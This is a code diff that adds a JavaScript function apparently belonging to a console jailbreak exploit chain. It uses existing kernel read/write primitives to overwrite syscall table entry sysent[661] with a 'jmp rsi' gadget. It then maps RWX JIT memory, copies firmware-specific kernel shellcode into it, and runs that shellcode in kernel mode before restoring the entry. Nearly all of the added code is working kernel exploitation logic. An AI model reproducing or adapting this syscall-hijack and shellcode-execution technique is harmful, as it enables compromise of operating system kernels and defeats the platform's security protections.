@@ -295,3 +295,138 @@ function find_proc_by_pid(pid) {
 
     return null;
 }
+
+// Apply kernel patches via kexec using a single ROP chain
+// This avoids returning to JS between critical operations
+function apply_kernel_patches(fw_version) {
+    try {
+        // Get shellcode for this firmware
+        const shellcode = get_kpatch_shellcode(fw_version);
+        if (!shellcode) {
+            logger.log("No kernel patch shellcode for FW " + fw_version);
+            return false;
+        }
+
+        logger.log("Kernel patch shellcode: " + shellcode.length + " bytes");
+
+        // Constants
+        const PROT_READ = 0x1n;
+        const PROT_WRITE = 0x2n;
+        const PROT_EXEC = 0x4n;
+        const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
+
+        const mapping_addr = 0x926100000n;  // Different from 0x920100000 to avoid conflicts
+        const aligned_memsz = 0x10000n;
+
+        // Get sysent[661] address and save original values
+        const sysent_661_addr = kernel.addr.base + kernel_offset.SYSENT_661;
+        logger.log("sysent[661] @ " + hex(sysent_661_addr));
+
+        const sy_narg = kernel.read_dword(sysent_661_addr);
+        const sy_call = kernel.read_qword(sysent_661_addr + 8n);
+        const sy_thrcnt = kernel.read_dword(sysent_661_addr + 0x2Cn);
+
+        logger.log("Original sy_narg: " + sy_narg);
+        logger.log("Original sy_call: " + hex(sy_call));
+        logger.log("Original sy_thrcnt: " + sy_thrcnt);
+
+        // Calculate jmp rsi gadget address
+        const jmp_rsi_gadget = kernel.addr.base + kernel_offset.JMP_RSI_GADGET;
+        logger.log("jmp rsi gadget @ " + hex(jmp_rsi_gadget));
+
+        // Allocate buffer for shellcode in userspace first
+        const shellcode_buf = malloc(shellcode.length + 0x100);
+        logger.log("Shellcode buffer @ " + hex(shellcode_buf));
+
+        // Copy shellcode to userspace buffer
+        for (let i = 0; i < shellcode.length; i++) {
+            write8_uncompressed(shellcode_buf + BigInt(i), shellcode[i]);
+        }
+
+        // Verify first bytes
+        const first_bytes = read32_uncompressed(shellcode_buf);
+        logger.log("First bytes @ shellcode: " + hex(first_bytes));
+
+        // Hijack sysent[661] to point to jmp rsi gadget
+        logger.log("Hijacking sysent[661]...");
+        kernel.write_dword(sysent_661_addr, 2n);           // sy_narg = 2
+        kernel.write_qword(sysent_661_addr + 8n, jmp_rsi_gadget);  // sy_call = jmp rsi
+        kernel.write_dword(sysent_661_addr + 0x2Cn, 1n);   // sy_thrcnt = 1
+        logger.log("Hijacked sysent[661]");
+        logger.flush();
+
+        // Check if jitshm_create has a dedicated gadget
+        const jitshm_num = Number(SYSCALL.jitshm_create);
+        const jitshm_gadget = syscall_gadget_table[jitshm_num];
+        logger.log("jitshm_create gadget: " + (jitshm_gadget ? hex(jitshm_gadget) : "NOT FOUND"));
+        logger.flush();
+
+        // Try using the standard syscall() function if gadget exists
+        if (!jitshm_gadget) {
+            logger.log("ERROR: jitshm_create gadget not found in libkernel");
+            logger.log("Kernel patches require jitshm_create syscall support");
+            return false;
+        }
+
+        // 1. jitshm_create(0, aligned_memsz, PROT_RWX)
+        logger.log("Calling jitshm_create...");
+        logger.flush();
+        const exec_handle = syscall(SYSCALL.jitshm_create, 0n, aligned_memsz, PROT_RWX);
+        logger.log("jitshm_create handle: " + hex(exec_handle));
+
+        if (exec_handle >= 0xffff800000000000n) {
+            logger.log("ERROR: jitshm_create failed");
+            kernel.write_dword(sysent_661_addr, sy_narg);
+            kernel.write_qword(sysent_661_addr + 8n, sy_call);
+            kernel.write_dword(sysent_661_addr + 0x2Cn, sy_thrcnt);
+            return false;
+        }
+
+        // 2. mmap(mapping_addr, aligned_memsz, PROT_RWX, MAP_SHARED|MAP_FIXED, exec_handle, 0)
+        logger.log("Calling mmap...");
+        logger.flush();
+        const mmap_result = syscall(SYSCALL.mmap, mapping_addr, aligned_memsz, PROT_RWX, 0x11n, exec_handle, 0n);
+        logger.log("mmap result: " + hex(mmap_result));
+
+        if (mmap_result >= 0xffff800000000000n) {
+            logger.log("ERROR: mmap failed");
+            kernel.write_dword(sysent_661_addr, sy_narg);
+            kernel.write_qword(sysent_661_addr + 8n, sy_call);
+            kernel.write_dword(sysent_661_addr + 0x2Cn, sy_thrcnt);
+            return false;
+        }
+
+        // 3. Copy shellcode to mapped memory
+        logger.log("Copying shellcode to " + hex(mapping_addr) + "...");
+        for (let j = 0; j < shellcode.length; j++) {
+            write8_uncompressed(mapping_addr + BigInt(j), shellcode[j]);
+        }
+
+        // Verify
+        const verify_bytes = read32_uncompressed(mapping_addr);
+        logger.log("First bytes @ mapped: " + hex(verify_bytes));
+        logger.flush();
+
+        // 4. kexec(mapping_addr) - syscall 661, hijacked to jmp rsi
+        logger.log("Calling kexec...");
+        logger.flush();
+        const kexec_result = syscall(SYSCALL.kexec, mapping_addr);
+        logger.log("kexec returned: " + hex(kexec_result));
+
+        // Restore original sysent[661]
+        logger.log("Restoring sysent[661]...");
+        kernel.write_dword(sysent_661_addr, sy_narg);
+        kernel.write_qword(sysent_661_addr + 8n, sy_call);
+        kernel.write_dword(sysent_661_addr + 0x2Cn, sy_thrcnt);
+        logger.log("Restored sysent[661]");
+
+        logger.log("Kernel patches applied!");
+        logger.flush();
+        return true;
+
+    } catch (e) {
+        logger.log("apply_kernel_patches error: " + e.message);
+        logger.log(e.stack);
+        return false;
+    }
+}
